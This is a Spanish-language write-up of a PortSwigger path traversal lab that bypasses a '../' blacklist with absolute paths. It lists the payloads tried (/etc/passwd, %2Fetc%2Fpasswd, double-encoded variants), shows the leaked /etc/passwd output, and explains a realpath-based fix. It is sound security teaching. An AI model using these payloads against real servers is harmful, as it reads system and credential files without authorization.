---
title: "Lab: File path traversal, traversal sequences blocked with absolute path bypass"
date: 2026-05-17
category: "Path Traversal"
order: 3
tags: ["web-security-academy", "path-traversal", "lab"]
layout: layouts/writeup.njk
permalink: /writeups/path-traversal-lab-absolute-path-bypass.html
---

## Descripción de la vulnerabilidad

Esta es una variante de Path Traversal donde la aplicación tiene una defensa parcial: **bloquea las secuencias `../`** para evitar directory traversal clásico. Sin embargo, el filtro es superficial — solo busca ese string literal y no valida que el filename empiece con el directorio base esperado. Esto permite bypassearlo con una ruta absoluta o con URL encoding.

---

## Reconocimiento

Mismo patrón que en el lab anterior — un parámetro `filename` que interactúa con el sistema de archivos:

```
GET /image?filename=18.jpg
```

Las rutas hardcodeadas como `/resources/images/rating4.png` no tienen parámetro controlable, por lo que no son superficie de ataque.

---

## Pruebas realizadas

### Intento 1 — Traversal clásico ❌

```
filename=../../../../etc/passwd
```

**Respuesta:** `400 Bad Request` — `"No such file"`. La app detectó la secuencia `../` y bloqueó el request.

### Intento 2 — Apuntar a directorio ❌

```
filename=/etc
```

**Respuesta:** `400 Bad Request` — `"No such file"`. `/etc` es un directorio, no un archivo. El servidor llegó ahí pero no encontró nada que servir — no es que el bypass fallara, es que el destino era incorrecto.

### Intento 3 — `../` en URL encoding ❌

```
filename=%2e%2e%2f
```

**Respuesta:** `400 Bad Request` — `"No such file"`. `%2e%2e%2f` es `../` codificado; el servidor lo bloqueó igual.

### Intento 4 — Ruta absoluta ✅

```
filename=/etc/passwd
```

**Respuesta:** `200 OK` — contenido de `/etc/passwd`. La app bloquea `../` pero no valida que el filename empiece con el directorio base. Una ruta absoluta pasa el filtro y el SO la resuelve directo.

### Intento 5 — Ruta absoluta con URL encoding ✅

```
filename=%2Fetc%2Fpasswd
```

**Respuesta:** `200 OK` — contenido de `/etc/passwd`. `%2F` es `/` en URL encoding. La app ve `%2Fetc%2Fpasswd`, no reconoce `../` en ninguna forma, pasa el filtro — pero el SO decodifica `%2F` a `/` y resuelve la ruta real.

---

## Explotación exitosa

Ambos bypasses devolvieron el contenido completo de `/etc/passwd`:

```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
...
peter:x:12001:12001::/home/peter:/bin/bash
carlos:x:12002:12002::/home/carlos:/bin/bash
user:x:12000:12000::/home/user:/bin/bash
```

---

## ¿Por qué funcionaron los bypasses?

El filtro de esta app hace algo como:

```python
if "../" in filename:
    return 400, "No such file"

# Si no hay "../", procede a leer el archivo
open(filename)  # ← sin validar si empieza con el directorio base
```

**Descuido 1 — No valida el prefijo:** solo bloquea `../` pero no verifica que el filename empiece con `/var/www/images/`. Una ruta absoluta como `/etc/passwd` pasa el filtro y el SO la resuelve directo desde la raíz.

**Descuido 2 — No decodifica antes de validar:** el filtro busca `../` como string literal. Si mandás `%2Fetc%2Fpasswd`, la app no ve ningún `../` y pasa la validación — pero el SO sí decodifica `%2F` a `/` al momento de leer el archivo.

---

## ¿Qué revela el comportamiento del filtro?

<table>
<tr><td>Payload</td><td>Respuesta</td><td>Conclusión</td></tr>
<tr><td><code>../../../../etc/passwd</code></td><td>400</td><td>Filtra <code>../</code> literal</td></tr>
<tr><td><code>%2e%2e%2f</code></td><td>400</td><td>También filtra <code>../</code> encoded</td></tr>
<tr><td><code>/etc</code></td><td>400 "No such file"</td><td>Ruta absoluta llega al SO, pero es directorio</td></tr>
<tr><td><code>/etc/passwd</code></td><td>200</td><td>No valida prefijo del directorio base</td></tr>
<tr><td><code>%2Fetc%2Fpasswd</code></td><td>200</td><td>No decodifica antes de validar</td></tr>
</table>

El patrón es claro: el filtro es una blacklist simple de `../` — no una validación real de la ruta.

---

## ¿Por qué una blacklist de `../` no es suficiente?

Porque hay múltiples formas de expresar la misma ruta sin usar `../`: ruta absoluta directa, URL encoding, double encoding (`%252Fetc%252Fpasswd`), encodings no estándar (`..%c0%af`). Un filtro de blacklist siempre puede ser bypasseado porque los atacantes tienen más variantes que las que el filtro contempla.

---

## ¿Cómo se previene correctamente?

La defensa correcta no es una blacklist de `../` — es validar la ruta **después** de resolverla:

```python
import os

BASE = "/var/www/images"
filename = request.params["filename"]

full_path = os.path.realpath(os.path.join(BASE, filename))

if not full_path.startswith(BASE):
    return 400, "Acceso denegado"

open(full_path)
```

Con esto, `/etc/passwd` y `%2Fetc%2Fpasswd` ambos resolverían a `/etc/passwd` — fuera del directorio base — y serían rechazados antes de tocar el disco.

---

## Lecciones aprendidas

- Un 400 con "No such file" ante `../` confirma que hay un filtro, pero no significa que la app sea segura.
- Probar ruta absoluta es el siguiente paso lógico cuando `../` está bloqueado.
- URL encoding de `/` (`%2F`) puede bypassear filtros que buscan caracteres literales.
- La diferencia entre `400 No such file` apuntando a un directorio vs a un archivo es importante — no confundirlo con que el bypass falló.
- Una blacklist de caracteres siempre es bypasseable — la defensa correcta es validar la ruta resuelta, no el input crudo.
- El filtro superficial es peor que no tener filtro, porque da falsa sensación de seguridad.

---

## Referencia

Lab oficial: [PortSwigger — File path traversal, traversal sequences blocked with absolute path bypass](https://portswigger.net/web-security/file-path-traversal/lab-simple)

**Estado:** Solved
